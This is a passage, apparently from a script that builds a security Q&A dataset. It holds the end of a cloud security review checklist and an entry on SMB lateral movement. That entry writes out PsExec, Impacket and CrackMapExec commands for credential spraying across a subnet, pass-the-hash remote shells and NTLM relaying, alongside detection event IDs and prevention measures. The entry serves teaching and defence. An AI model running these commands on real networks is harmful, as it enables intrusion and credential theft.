  "Cloud security architecture review: assess security design of cloud infrastructure; identify gaps before deployment or as part of ongoing governance. Scope: all cloud resources and services used (compute, storage, network, identity, database, serverless, containers); multi-cloud if applicable; IaC (Terraform, CloudFormation, Pulumi) reviewed alongside deployed state. Identity and access: is IAM least-privilege enforced? service accounts, workload identities, human users, cross-account access; are there AWS root account restrictions? (no access keys, MFA required, no regular use); is there federation to corporate IdP (SAML/OIDC) or are local cloud IAM users used?; are privilege escalation paths identified (CIEM analysis)?; is MFA enforced for all human access? Network architecture: is network segmentation implemented (VPCs, subnets, NSGs, security groups)?; are private subnets used for databases and backend services?; is there network flow logging (VPC Flow Logs)?; are internet-facing services minimal (only load balancers/CDN exposed)?; is there WAF on internet-facing applications?; are VPN or private connectivity (Direct Connect, ExpressRoute, Cloud Interconnect) used instead of internet for corporate access? Data security: is data classified? Are sensitive data stores identified?; is encryption at rest enabled for all storage (EBS, S3, RDS, DynamoDB)?; are customer-managed encryption keys (CMEK) used for sensitive data?; is data exfiltration prevention in place (VPC Service Controls, S3 bucket policies, DLP)?; are backup and recovery tested? Logging and monitoring: is cloud audit logging comprehensive (CloudTrail, Activity Log, Cloud Audit Logs)?; is threat detection enabled (GuardDuty, Defender for Cloud, Security Command Center)?; are logs forwarded to SIEM?; is there alerting on critical events (root login, IAM changes, public bucket creation, privilege escalation)?; is retention adequate (1 year minimum)? Compliance and posture: is CSPM tool deployed and configured with compliance frameworks?; are CI/CD pipelines scanning IaC before deployment (Checkov, tfsec)?; are regular access reviews conducted?; is the incident response plan updated for cloud scenarios?; are cloud-specific OPSEC considerations addressed (no shared credentials, separate prod and dev accounts with SCP guardrails)?")

p("What is lateral movement via SMB?",
  "SMB (Server Message Block) lateral movement: exploit Windows file sharing protocol for lateral movement; most common lateral movement technique. Prerequisites: valid credentials (plaintext, NTLM hash, or Kerberos ticket) for target system local admin or domain admin. Techniques: PsExec (Sysinternals): copies service binary to ADMIN$ share; installs service remotely; executes; most detected by EDR; leaves significant forensic artefacts; network: port 445 plus IPC$; command: psexec \\\\TARGET -u domain\\admin -p password cmd.exe; SMBExec (Impacket): similar to PsExec but creates service remotely using SVCCTL RPC calls; more covert than PsExec; Impacket smbexec.py domain/admin:pass@TARGET. CrackMapExec (CME): network-wide SMB attack tool; test credentials across all hosts: cme smb 192.168.1.0/24 -u admin -p password (test credentials on all hosts); execute commands: cme smb TARGET -u admin -p pass -x whoami; modules: mimikatz, lsassy (remote credential dump), spider_plus (file enumeration). Pass-the-Hash via SMB: Impacket smbclient.py: smbclient.py domain/admin@TARGET -hashes LM:NTLM; access SMB shares with hash without cracking; psexec.py -hashes LM:NTLM domain/admin@TARGET (remote shell via hash). SMB relay attack: capture NTLM authentication challenge-response from victim (Responder: poison LLMNR/NBT-NS to intercept authentication); relay captured credentials to target system in real-time; no need to crack hash; target authenticates relay as victim; ntlmrelayx.py (Impacket): capture and relay NTLM auth to SMB or LDAP; Defence: SMB signing: all SMB connections require cryptographic signature; relay attacks fail (cannot create valid signature without knowing password). Detection: Event 4648 (login with explicit credentials) on target; Event 4624 logon type 3 (network) from unusual source; ADMIN$ or IPC$ share connection from workstation to workstation; Service installation events (7045) from lateral movement; Sysmon network connection to port 445 from unusual source. Prevention: host-based firewall block SMB between workstations (workstation-to-workstation port 445 generally not needed); block SMB to servers except from admin subnets; LAPS (unique local admin passwords); SMB signing enforcement; disable SMBv1 (EternalBlue vector); Kerberos armoring (FAST) for additional auth protection.")

